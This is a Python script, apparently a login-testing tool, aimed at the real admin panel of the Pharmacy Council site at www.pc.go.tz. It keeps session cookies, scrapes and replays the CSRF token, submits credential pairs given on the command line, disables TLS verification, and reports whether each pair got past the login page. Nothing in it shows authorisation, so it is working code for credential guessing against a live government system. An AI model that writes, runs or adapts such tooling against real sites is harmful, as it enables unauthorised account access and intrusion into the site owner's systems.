"""Session-bound login probe: keeps cookies, sends a fresh CSRF token.

Failure = /root/ returns the login form again. Success = it does not.
"""
import http.cookiejar
import re
import ssl
import sys
import urllib.parse
import urllib.request

BASE = "https://www.pc.go.tz/admin/"
ROOT = "https://www.pc.go.tz/root/"
UA = "Mozilla/5.0 (compatible; pctz-probe/1.0)"
CTX = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode = ssl.CERT_NONE

LOGIN_MARK = 'Pharmacy Council Admin Panel'


def session():
    jar = http.cookiejar.CookieJar()
    return urllib.request.build_opener(
        urllib.request.HTTPCookieProcessor(jar),
        urllib.request.HTTPSHandler(context=CTX))


def fetch(op, url, data=None, referer=None):
    hdrs = {"User-Agent": UA}
    if referer:
        hdrs["Referer"] = referer
    if data is not None:
        hdrs["Content-Type"] = "application/x-www-form-urlencoded"
    req = urllib.request.Request(url, data=data, headers=hdrs)
    try:
        with op.open(req, timeout=20) as r:
            return r.status, r.read(60000).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read(20000).decode("utf-8", "replace")
    except Exception as e:
        return 0, str(e)


def attempt(user, pwd):
    """Log in with one credential pair; returns (status, authenticated, body)."""
    op = session()
    _, page = fetch(op, BASE)
    m = re.search(r'name="pct_token" value="([^"]+)"', page)
    if not m:
        return 0, False, "no CSRF token found"
    data = urllib.parse.urlencode(
        {"username": user, "password": pwd, "pct_token": m.group(1)}).encode()
    fetch(op, BASE, data=data, referer=BASE)
    st2, body = fetch(op, ROOT)
    return st2, LOGIN_MARK not in body, body


if __name__ == "__main__":
    u, p = sys.argv[1], sys.argv[2]
    st, authed, body = attempt(u, p)
    print(f"{u!r} / {p!r} -> status={st} authenticated={authed} len={len(body)}")
    if not authed:
        print("   snippet:", re.sub(r"\s+", " ", body)[:160])
